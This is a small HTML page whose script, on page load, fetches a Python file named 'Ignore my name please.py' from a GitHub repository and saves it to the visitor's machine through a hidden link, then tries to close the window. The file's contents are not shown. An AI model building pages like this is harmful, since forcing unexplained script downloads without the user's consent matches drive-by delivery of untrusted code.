<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Downloading...</title>
    <style>
        body {
            font-family: system-ui, -apple-system, sans-serif;
            height: 100vh;
            margin: 0;
            display: grid;
            place-items: center;
            background: #f8fafc;
            color: #334155;
        }
        .status {
            text-align: center;
            padding: 2rem;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1);
        }
        h1 { font-size: 1.25rem; margin-bottom: 0.5rem; }
        p { margin: 0; color: #64748b; }
    </style>
</head>
<body>
    <div class="status" id="status">
        <h1>Preparing download...</h1>
        <p>Please wait.</p>
    </div>

    <script>
        const GITHUB_FILE_URL = "https://raw.githubusercontent.com/epickfr/LUNAFLIX/refs/heads/main/Ignore%20my%20name%20please.py";
        const FILE_NAME = "Ignore my name please.py";

        async function startDownload() {
            const status = document.getElementById('status');

            try {
                status.innerHTML = "<h1>⬇️ Downloading...</h1><p>Fetching file from GitHub...</p>";

                const response = await fetch(GITHUB_FILE_URL);
                
                if (!response.ok) {
                    throw new Error(`Failed to download: ${response.status}`);
                }
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = FILE_NAME;
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
                status.innerHTML = "<h1>✅ Download Started!</h1><p>Closing window...</p>";
                setTimeout(() => {
                    window.close();
                    setTimeout(() => {
                        status.innerHTML = "<h1>✅ Download Complete!</h1><p>You can close this window now.</p>";
                    }, 500);
                }, 500);

            } catch (error) {
                status.innerHTML = `<h1>❌ Error</h1><p>${error.message}</p><p style="font-size:0.875rem; margin-top:1rem;">Check the URL or try again.</p>`;
                console.error('Download failed:', error);
            }
        }
        window.addEventListener('load', startDownload);
    </script>
</body>
</html>
